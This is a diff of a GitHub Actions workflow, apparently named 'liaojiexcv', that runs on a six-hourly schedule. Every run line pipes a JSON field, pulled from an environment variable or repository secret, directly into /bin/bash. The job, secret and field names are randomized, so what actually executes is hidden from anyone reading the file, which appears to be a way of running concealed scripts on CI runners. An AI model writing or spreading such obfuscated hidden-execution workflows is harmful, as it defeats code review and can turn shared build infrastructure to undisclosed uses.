@@ -2,9 +2,8 @@ name: liaojiexcv
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
-
-jobs:  # 32716
+    - cron: '28 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,22 +11,15 @@ jobs:  # 32716
       - uses: actions/checkout@v4
       - name: liaojiexcv
         env:
-          ubhy5614: ${{ secrets.ubhy5614 }}
+          atpl3182: ${{ secrets.atpl3182 }}
         run: |
-          echo $ubhy5614 | jq -r .zhpm38319 | /bin/bash
-          echo $ce54 | jq -r .bqw667 | /bin/bash
-          echo $aud09 | jq -r .nkl1 | /bin/bash
-          echo $o0 | jq -r .t6797 | /bin/bash
-          echo $oh06 | jq -r .bnpv36635 | /bin/bash
-          echo $kuga425 | jq -r .nvsrw76 | /bin/bash
-          echo $jdlkr9057 | jq -r .gn4 | /bin/bash
-          echo $pz98 | jq -r .oah0 | /bin/bash
-          echo $n78 | jq -r .tkxgy53 | /bin/bash
-          echo $uj70482 | jq -r .cst8407 | /bin/bash
-          echo $jd4 | jq -r .bbl18192 | /bin/bash
-          echo $nchv64 | jq -r .plol66 | /bin/bash
-          echo $wcplx4562 | jq -r .qh356 | /bin/bash
-          echo $gv98992 | jq -r .wh399 | /bin/bash
-          echo $hojy81781 | jq -r .ktq52773 | /bin/bash
-          echo $o216 | jq -r .m3 | /bin/bash
+          echo $atpl3182 | jq -r .qw7920 | /bin/bash
+          echo $cjy6858 | jq -r .h15 | /bin/bash
+          echo $tqcd34590 | jq -r .ojvul2 | /bin/bash
+          echo $rcbu483 | jq -r .z15 | /bin/bash
+          echo $ah15474 | jq -r .do19 | /bin/bash
+          echo $qc49044 | jq -r .xd99 | /bin/bash
+          echo $kabv2369 | jq -r .bb8446 | /bin/bash
+          echo $lad3451 | jq -r .fys88 | /bin/bash
+          echo $hbkq38838 | jq -r .uvv471 | /bin/bash
 
